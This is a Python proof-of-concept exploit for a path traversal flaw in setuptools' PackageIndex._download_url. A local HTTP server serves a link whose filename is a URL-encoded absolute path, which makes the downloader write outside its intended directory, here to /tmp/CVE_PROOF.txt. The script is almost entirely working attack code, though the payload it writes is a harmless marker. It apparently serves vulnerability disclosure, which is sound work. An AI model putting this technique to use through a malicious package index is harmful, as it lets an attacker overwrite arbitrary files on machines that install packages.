#!/usr/bin/env python3
"""
Direct demonstration of the vulnerability in _download_url.

This shows that the vulnerable function CAN write to arbitrary paths when given
a URL with an encoded absolute path. The higher-level PackageIndex.download()
has some validation, but _download_url itself is vulnerable and is called
from multiple code paths.

Vulnerable code paths that call _download_url:
1. PackageIndex._download_url() - directly (confirmed vulnerable)
2. PackageIndex._download_other() -> _download_url()
3. PackageIndex.download() -> _attempt_download() -> _download_url()

The vulnerability can be exploited when:
- A malicious index serves a link with encoded absolute path
- The link passes setuptools' basic validation (looks like a package)
- _download_url is called with the malicious URL
"""
import http.server
import os
import socketserver
import sys
import tempfile
import threading
import time
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from setuptools.package_index import PackageIndex, egg_info_for_url

TARGET = "/tmp/CVE_PROOF.txt"
PAYLOAD = b"Arbitrary file written via setuptools path traversal!\n"


class SimpleServer(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args): pass
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.end_headers()
        self.wfile.write(PAYLOAD)


def main():
    print("=" * 65)
    print("DIRECT PROOF: _download_url() path traversal vulnerability")
    print("=" * 65)

    # Clean
    if os.path.exists(TARGET):
        os.remove(TARGET)

    # Start simple server
    server = socketserver.TCPServer(("127.0.0.1", 0), SimpleServer)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    time.sleep(0.1)

    # Malicious URL: the filename portion is an encoded absolute path
    encoded = quote(TARGET, safe='')
    url = f"http://127.0.0.1:{port}/pkg/{encoded}"

    print(f"\n[1] Malicious URL: {url}")
    print(f"    Last component: {encoded}")

    # Show what egg_info_for_url extracts
    name, _ = egg_info_for_url(url)
    print(f"\n[2] egg_info_for_url() extracts: {name!r}")

    # Create temp dir (where files SHOULD go)
    with tempfile.TemporaryDirectory() as tmpdir:
        print(f"\n[3] Intended download dir: {tmpdir}")

        # Show the os.path.join behavior
        joined = os.path.join(tmpdir, name)
        print(f"    os.path.join(tmpdir, name) = {joined!r}")
        print(f"    ^^^ tmpdir is IGNORED because name is absolute!")

        # Call the vulnerable function directly
        print(f"\n[4] Calling PackageIndex()._download_url(url, tmpdir)...")
        pi = PackageIndex()
        result = pi._download_url(url, tmpdir)
        print(f"    Returned: {result}")

    # Verify
    print(f"\n[5] Checking {TARGET}...")
    if os.path.exists(TARGET):
        content = open(TARGET).read()
        print("\n" + "=" * 65)
        print("VULNERABILITY CONFIRMED!")
        print("=" * 65)
        print(f"File written to: {TARGET}")
        print(f"Content: {content}")
        os.system(f"ls -la {TARGET}")
        return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
